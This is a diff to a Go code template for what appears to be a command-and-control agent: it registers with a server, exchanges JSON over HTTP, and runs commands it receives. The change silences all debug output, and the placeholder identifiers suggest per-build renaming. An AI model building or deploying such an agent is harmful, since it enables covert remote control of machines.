@@ -188,13 +188,13 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data
 	if data != nil {
 		jsonData, err := json.Marshal(data)
 		if err != nil {
-			fmt.Printf("[DEBUG] Failed to marshal JSON data: %v\n", err)
+			// fmt.Printf("[DEBUG] Failed to marshal JSON data: %v\n", err)
 			return nil, err
 		}
 		// fmt.Printf("[DEBUG] JSON data to send: %s\n", string(jsonData))
 		req, err = http.NewRequest(method, url, bytes.NewBuffer(jsonData))
 		if err != nil {
-			fmt.Printf("[DEBUG] Failed to create HTTP request: %v\n", err)
+			// fmt.Printf("[DEBUG] Failed to create HTTP request: %v\n", err)
 			return nil, err
 		}
 		req.Header.Set("Content-Type", "application/json")
@@ -202,7 +202,7 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data
 		// fmt.Println("[DEBUG] Creating request with no body")
 		req, err = http.NewRequest(method, url, nil)
 		if err != nil {
-			fmt.Printf("[DEBUG] Failed to create HTTP request: %v\n", err)
+			// fmt.Printf("[DEBUG] Failed to create HTTP request: %v\n", err)
 			return nil, err
 		}
 	}
@@ -214,7 +214,7 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data
 	// fmt.Println("[DEBUG] Sending HTTP request...")
 	resp, err := client.Do(req)
 	if err != nil {
-		fmt.Printf("[DEBUG] HTTP request failed: %v\n", err)
+		// fmt.Printf("[DEBUG] HTTP request failed: %v\n", err)
 		return nil, err
 	}
 	defer resp.Body.Close()
@@ -223,21 +223,21 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data
 
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		fmt.Printf("[DEBUG] Failed to read response body: %v\n", err)
+		// fmt.Printf("[DEBUG] Failed to read response body: %v\n", err)
 		return nil, err
 	}
 
 	// fmt.Printf("[DEBUG] HTTP response body: %s\n", string(body))
 
 	if resp.StatusCode != 200 {
-		fmt.Printf("[DEBUG] HTTP error received: %d\n", resp.StatusCode)
+		// fmt.Printf("[DEBUG] HTTP error received: %d\n", resp.StatusCode)
 		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
 	}
 
 	var apiResp {API_RESPONSE_STRUCT_NAME}
 	err = json.Unmarshal(body, &apiResp)
 	if err != nil {
-		fmt.Printf("[DEBUG] Failed to unmarshal response JSON: %v\n", err)
+		// fmt.Printf("[DEBUG] Failed to unmarshal response JSON: %v\n", err)
 		return nil, err
 	}
 
@@ -276,7 +276,7 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_REGISTER_FUNC}() error {
 	// fmt.Printf("[DEBUG] Registration data: %+v\n", data)
 	resp, err := a.{AGENT_SEND_FUNC}("POST", a.{AGENT_REGISTER_URI_FIELD}, data)
 	if err != nil {
-		fmt.Printf("[DEBUG] Registration request failed: %v\n", err)
+		// fmt.Printf("[DEBUG] Registration request failed: %v\n", err)
 		return err
 	}
 
@@ -727,9 +727,9 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) strin
 		os.Exit(0)
 		return "[SUCCESS] Agent killed"
 	} else {
-		fmt.Println("[DEBUG] Processing regular command via execute function")
+		// fmt.Println("[DEBUG] Processing regular command via execute function")
 		result := a.{AGENT_EXECUTE_FUNC}(command)
-		fmt.Printf("[DEBUG] Regular command result: %s\n", result)
+		// fmt.Printf("[DEBUG] Regular command result: %s\n", result)
 		return result
 	}
 }
